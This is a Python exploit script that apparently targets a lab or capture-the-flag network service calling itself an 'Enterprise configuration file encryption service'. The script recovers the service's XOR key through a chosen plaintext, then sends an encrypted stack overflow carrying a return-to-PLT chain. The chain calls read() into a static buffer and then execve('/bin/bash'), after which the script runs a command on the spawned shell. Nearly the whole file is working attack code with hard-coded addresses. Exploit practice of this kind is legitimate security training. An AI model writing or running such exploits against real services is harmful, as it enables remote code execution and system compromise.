#!/usr/bin/env python
# The xor part is trivial. To exploit the stack, we will
# return into the plt. First, read from our socket to
# &keybuf (static) and then execve.
#
# &keybuf = 0x0804b480
# 0x08048b0f =>  add 0x4, %esp; pop %ebx; pop %ebp
# execve.plt     => 0x080489b6
# read.plt       => 0x08048860
# Stack layout:
# [ read.plt ] [ &pop-pop-pop-ret ] [ fd(0/1) ] [ &keybuf ] [ size ]
# [ execve.plt ] [ JUNK ] [ &keybuf ] [ &keybuf + 20 ] [ 0x00000000 ]
#
# What read() will see on the socket:
# keybuf : "/bin/bash" + "\x00 * 7 +"\x00" * 4 + 0x0804b480  + "\x00" * 4

import socket
import struct
import time
import logging
logging.basicConfig(level=logging.DEBUG)

cmd = "id"
b1l = len("[-- Enterprise configuration file encryption service --]\n")
b2l = len("[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")

def purge_banner(s, l):
  x = "" 
  while len(x) != l:
    x += s.recv(l-len(x))
    logging.debug(repr(x))

def encrypt(p, k):
  # p is char*
  # k is uint[32]
  l = len(p)
  blocks = l/4.
  if l & 3: 
    blocks += 1  
  logging.debug("blocks=" + str(blocks))
  c_p = ""
  for i in range(int(blocks)):
    e = struct.unpack("I", p[4*i:4*(i+1)])[0] ^ k[i % 32]
    c_p += struct.pack("I", e)
  return c_p

def retrieve_xor_key(s):
  plain_text = "AAAA" * 32
  s.send("E")
  s.send(struct.pack("I", len(plain_text)))
  s.send(plain_text)
  purge_banner(s, b2l)
  l = struct.unpack("I", s.recv(4))[0]
  x = s.recv(1024)
  if l != len(x):
    raise Exception(str(l) + str(len(x)))
  o_c = struct.unpack("I", "AAAA")[0]
  key = []
  for i in range(32):
    key.append(o_c ^ struct.unpack("I", x[4*i:4*(i+1)])[0])
  return key


s = socket.create_connection(("192.168.122.37", "20002"))
purge_banner(s, b1l)
key = retrieve_xor_key(s)
logging.debug("key: " + str(key))
shellcode = "A" * (4096*32) + "B"*16 
shellcode += "\x60\x88\x04\x08" + "\x0f\x8b\x04\x08" + "\x01\x00\x00\x00" + "\x80\xb4\x04\x08" + "\x1c\x00\x00\x00"
shellcode += "\xb6\x89\x04\x08" + "JUNK" + "\x80\xb4\x04\x08" + "\x94\xb4\x04\x08" + "\x00" * 4
cipher_shellcode =  encrypt(shellcode, key)
s.send("E")
s.send(struct.pack("I", len(cipher_shellcode)))
s.send(cipher_shellcode)
purge_banner(s, b2l)
l = struct.unpack("I", s.recv(4))[0]
logging.debug("reading " + str(l))
x = ""
while len(x) < l:
  logging.debug("trying to read " + str(l - len(x)))
  x += s.recv(l - len(x))
s.send("Q")
s.send("/bin/bash" + "\x00"*7 + "\x00"*4 + "\x80\xb4\x04\x08" + "\x00" *4)
print ">>", cmd
s.send(cmd + "\n")
print "<<", s.recv(1024)

